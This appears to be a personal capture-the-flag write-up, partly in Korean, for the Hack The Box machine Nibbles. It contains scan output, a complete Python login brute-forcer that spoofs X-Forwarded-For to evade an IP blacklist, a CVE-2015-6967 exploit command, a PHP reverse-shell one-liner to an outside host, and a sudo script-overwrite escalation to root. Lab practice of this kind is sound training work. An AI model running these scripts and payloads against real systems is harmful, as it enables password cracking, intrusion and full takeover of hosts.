---
tags:
  - type/machine
  - platform/htb
  - os/linux
  - status/unsolved
  - tech/lin/sudo-abuse
  - tech/cred/crack
  - tech/enum/dirbust
type: machine
platform: htb
os: linux
ip: 10.129.99.181
ports: [22, 80]
services: [http, ssh]
cves: [CVE-2015-6967]
status: unsolved
tech_count: 3
---


## Nmap
```bash
┌──(kali㉿kali)-[~/HTB/Nibbles]
└─$ nmap -sS -sV -p- -Pn --min-rate 5000 10.129.99.181 -oN 10.129.99.181.log
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-27 13:58 KST
Nmap scan report for 10.129.99.181
Host is up (0.25s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.25 seconds
```


웹사이트 접근 후 하위 주소 확인
![[Pasted image 20260127170236.png]]


```bash
┌──(kali㉿kali)-[~/HTB/Nibbles]
└─$ feroxbuster -u http://10.129.99.181/nibbleblog -s 200 -t 200 -w /usr/share/wordlists/dirb/common.txt
                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.99.181/nibbleblog
 🚩  In-Scope Url          │ 10.129.99.181
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       27l       96w     1401c http://10.129.99.181/nibbleblog/admin.php
200      GET      288l     1575w    17763c http://10.129.99.181/nibbleblog/languages/de_DE.bit
200      GET       63l      643w     4628c http://10.129.99.181/nibbleblog/README
200      GET       61l      168w     2987c http://10.129.99.181/nibbleblog/index.php
[####################] - 22s     4708/4708    0s      found:4       errors:194    
[####################] - 19s     4614/4614    239/s   http://10.129.99.181/nibbleblog/ 
[####################] - 1s      4614/4614    6023/s  http://10.129.99.181/nibbleblog/admin/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s      4614/4614    6991/s  http://10.129.99.181/nibbleblog/content/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s      4614/4614    636/s   http://10.129.99.181/nibbleblog/languages/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s      4614/4614    635/s   http://10.129.99.181/nibbleblog/plugins/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 6s      4614/4614    764/s   http://10.129.99.181/nibbleblog/themes/ => Directory listing (add --scan-dir-listings to scan)     
```


password 제한이 존재하여 python으로 brute force 

```python
from random import randint

import requests


# -------------------------------------------------------------
# TODO:
# - Add all project specific information as program arguments.
# - Add tried IP addresses to a set to avoid accidental reuse.
# - Don't generate network or broadcast IP addresses.
# - Consider removing the requests dependency and using urllib.
# -------------------------------------------------------------


# Brute force information
# The `RATE_LIMIT` value should be the number of requests after
# which an IP address is blacklisted. We will switch IP addresses
# before this limit is hit to avoid spamming the blacklist log.
PASSWORD_LIST = '/usr/share/wordlists/rockyou.txt'
RATE_LIMIT = 5
RATE_LIMIT_ERROR = 'Blacklist protection'
LOGIN_FAILED_ERROR = 'Incorrect username or password.'

# Target information
RHOST = '10.129.100.146'
LOGIN_PAGE = '/nibbleblog/admin.php'
TARGET_URL = f'http://{RHOST}{LOGIN_PAGE}'
USERNAME = 'admin'


def attempt_login(password: str, ip: str) -> bool:
    """Performs a login using a given password.

    :param password: The password to try.
    :param ip: Spoof the attacker's IP address with this one.
    :return: True if the login was successful, otherwise False.
    """
    headers = {'X-Forwarded-For': ip}
    payload = {'username': USERNAME, 'password': password}
    r = requests.post(TARGET_URL, headers=headers, data=payload)

    if r.status_code == 500:
        print("Internal server error, aborting!")
        exit(1)

    if RATE_LIMIT_ERROR in r.text:
        print("Rate limit hit, aborting!")
        exit(1)

    return LOGIN_FAILED_ERROR not in r.text


def random_ip() -> str:
    """Generate a random IP address.

    :return: A random IP address.
    """
    return ".".join(str(randint(0, 255)) for _ in range(4))


def run(start_at: int = 1):
    """Start the brute force process.

    :param start_at: Start brute forcing at the password with this 1-based index.
     The number represents the line in the password file. This is handy if the
     program was stopped during a previous attempt, allowing the user to resume
     the attack.
    """
    ip: str = random_ip()
    num_attempts: int = 1

    for password in open(PASSWORD_LIST):
        if num_attempts < start_at:
            num_attempts += 1
            continue

        if num_attempts % (RATE_LIMIT - 1) == 0:
            ip = random_ip()

        password = password.strip()
        print(f"Attempt {num_attempts}: {ip}\t\t{password}")

        if attempt_login(password, ip):
            print(f"Password for {USERNAME} is {password}")
            break
        
        num_attempts += 1

        
if __name__ == '__main__':
    run()



```
https://github.com/hadrian3689/nibbleblog_4.0.3/blob/master/nibbleblog_4.0.3.py

cve 취약점 사용 cve-2015-6967
```bash
python3 cve-2015-6967.py -t http://10.129.100.146/nibbleblog/admin.php -u admin -p nibbles -shell  

php -r '$sock=fsockopen("10.10.15.161",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

```
![[Pasted image 20260128113250.png]]


sudo -l 확인 시 nopasswd 확인


![[Pasted image 20260128133556.png]]

monitor.sh 내용 수정 후 root 획득
```bash
echo "#!/bin/bash" > /home/nibbler/personal/stuff/monitor.sh
echo "/bin/bash" >> /home/nibbler/personal/stuff/monitor.sh
```


![[Pasted image 20260128134020.png]]

